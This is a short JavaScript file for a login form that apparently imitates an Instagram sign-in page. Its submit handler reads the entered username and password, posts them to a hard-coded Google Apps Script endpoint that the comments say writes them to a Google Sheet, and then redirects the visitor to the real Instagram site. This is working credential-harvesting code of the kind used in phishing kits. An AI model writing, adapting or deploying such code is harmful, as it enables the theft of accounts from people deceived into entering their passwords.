document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Replace with your actual Google Apps Script Web App URL
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxEunTvVkVL9HXk18_PFZDTkjUlr8G_zSvDuXjCnQRZdPej0HDjdHYbaFJzVEkoqtez/exec';

    // Send data to Google Sheet
    fetch(scriptURL, {
        method: 'POST',
        body: new URLSearchParams({
            'username': username,
            'password': password
        }),
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    })
    .then(response => response.text())
    .then(data => {
        console.log(data);
        // Example credentials check (use secure methods in real applications)
        if (username === 'correctUsername' && password === 'correctPassword') {
            // Redirect to Instagram or simulate login
            window.location.href = 'https://www.instagram.com'; // Redirect to Instagram
        } else {
            alert('Incorrect username or password');
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });
});

document.getElementById('toggle-password').addEventListener('click', function() {
    const passwordField = document.getElementById('password');
    const eyeIcon = document.getElementById('toggle-password');
    
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        eyeIcon.classList.add('visible');
    } else {
        passwordField.type = 'password';
        eyeIcon.classList.remove('visible');
    }
});
